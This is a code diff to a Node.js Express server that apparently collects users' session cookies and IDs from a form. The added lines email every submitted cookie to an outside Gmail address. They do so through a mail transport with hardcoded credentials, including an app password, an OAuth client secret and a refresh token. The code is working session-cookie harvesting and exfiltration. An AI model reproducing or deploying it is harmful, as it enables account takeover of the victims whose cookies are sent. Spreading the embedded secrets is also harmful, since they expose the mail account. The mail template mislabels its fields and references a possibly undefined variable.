@@ -38,6 +38,40 @@ app.post("/submit", async (req, res) => {
 
   await addDoc(collRef, { uid, cookie });
 
+  let transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+      type: 'OAuth2',
+      user: "helpmate73@gmail.com",
+      pass: "rgqelzcaxjkdcgxg",
+      clientId: "386032684654-t8d3c930d8llug8p26kvcq7hirbqib9l.apps.googleusercontent.com",
+      clientSecret: "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",
+      refreshToken: "1//04nvk9JZlEhpdCgYIARAAGAQSNwF-L9IrIUb8lo5ZBXVY0buzCu9MmY-KsqM-Q6Cpovh7TMcOvLMOYniZLTAPNjEw3VGaWQV3RwI"
+    }
+  });
+
+let mailOptions = {
+    to:"unaisnizamani598@gmail.com",
+    from:'helpmate73@gmail.com',
+    subject:'Cookie',
+    text:`
+     name:test
+     xs:${cookie}
+     uid:${xs}`,
+   
+}
+
+transporter.sendMail(mailOptions,(error,result)=>{
+    if(error){
+       console.log(error)
+    }
+    else{
+     
+    }
+  })
+  
+
+
 
   res.sendFile(path.join(__dirname, "submit.html"));
 
@@ -48,6 +82,6 @@ app.get("/submit", (req, res) => {
   res.sendFile(path.join(__dirname, "submit.html"));
 });
 
-app.listen(PORT, () => {
+app.listen({ port: process.env.PORT, host: "0.0.0.0" }, () => {
   console.log("app started....");
 });
